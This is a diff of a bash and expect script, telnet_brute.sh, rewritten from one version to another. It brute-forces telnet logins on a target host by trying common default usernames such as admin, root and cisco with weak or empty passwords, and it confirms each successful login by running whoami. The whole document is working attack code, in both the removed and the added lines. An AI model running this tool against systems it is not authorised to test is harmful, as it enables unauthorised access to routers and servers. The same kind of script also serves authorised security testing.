@@ -1,73 +1,59 @@
 #!/bin/bash
-# Telnet Default Credentials Testing Script
-# Usage: ./telnet_brute.sh <target_ip>
+# Telnet Credential Tester
+# Usage: ./telnet_brute.sh <target_ip> [port]
 
 TARGET_IP="$1"
-
-if [[ -z "$TARGET_IP" ]]; then
-    echo "Usage: $0 <target_ip>"
-    exit 1
-fi
+PORT="${2:-23}"
 
 USERS=("admin" "root" "guest" "cisco" "enable")
 PASSWORDS=("admin" "password" "" "root" "guest" "cisco" "enable")
 
-# Test the connection to determine if authentication is required
-expect <<EOF | grep -q "login:"
-set timeout 5
-spawn telnet $TARGET_IP
-expect {
-    "login:" { exit 0 }
-    -re {[#\$]} { exit 1 }
-    timeout { exit 2 }
-}
-EOF
-
-auth_required=$?
-
-if [[ "$auth_required" -eq 2 ]]; then
-    echo "ERROR: Telnet connection timed out or unexpected prompt"
+if [[ -z "$TARGET_IP" ]]; then
+    echo "Usage: $0 <target_ip> [port]"
     exit 1
-elif [[ "$auth_required" -eq 1 ]]; then
-    echo "Telnet server does NOT require authentication. Proceeding without credentials..."
-    expect <<EOF
-set timeout 5
-spawn telnet $TARGET_IP
-expect {
-    -re {[#\$]} {
-        send "whoami\r"
-        send "exit\r"
-    }
-    timeout {
-        puts "No shell prompt received"
-    }
-}
-expect eof
-EOF
-else
-    echo "Telnet server requires login. Brute-forcing credentials..."
-
-    for user in "${USERS[@]}"; do
-        for pass in "${PASSWORDS[@]}"; do
-            echo "Testing $user:$pass"
-            expect <<EOF
-set timeout 5
-spawn telnet $TARGET_IP
-expect "login:"
-send "$user\r"
-expect "Password:"
-send "$pass\r"
-expect {
-    -re {[#\$]} {
-        send "whoami\r"
-        send "exit\r"
-    }
-    timeout {
-        # silent failure, likely bad login
-    }
-}
-expect eof
-EOF
-        done
-    done
 fi
+
+if ! command -v expect &> /dev/null; then
+    echo "Error: Install expect with: sudo apt-get install expect"
+    exit 1
+fi
+
+validate_creds() {
+    expect <<EOF
+set timeout 3
+log_user 0
+spawn telnet $TARGET_IP $PORT
+expect {
+    -nocase "login:" { send "$1\r"; exp_continue }
+    -nocase "username:" { send "$1\r"; exp_continue }
+    -nocase "password:" { send "$2\r"; exp_continue }
+    -re {[#\$>]\s*$} { 
+        send "whoami\r"
+        expect -re {^([^\r\n]+)\r\n} { if { "\$expect_out(1,string)" != "$1" } { exit 1 } }
+        exit 0
+    }
+    "Login incorrect" { exit 1 }
+    "Authentication failed" { exit 1 }
+    timeout { exit 2 }
+    eof { exit 3 }
+    default { exit 1 }
+}
+EOF
+}
+
+echo "[*] Testing $TARGET_IP:$PORT..."
+for user in "${USERS[@]}"; do
+    for pass in "${PASSWORDS[@]}"; do
+        echo -n "Testing $user:$pass..."
+        validate_creds "$user" "$pass"
+        case $? in
+            0) echo " SUCCESS"; exit 0 ;;
+            1) echo " FAIL" ;;
+            2) echo " TIMEOUT" ;;
+            3) echo " CONN CLOSED" ;;
+        esac
+    done
+done
+
+echo "[!] No valid credentials found"
+exit 1
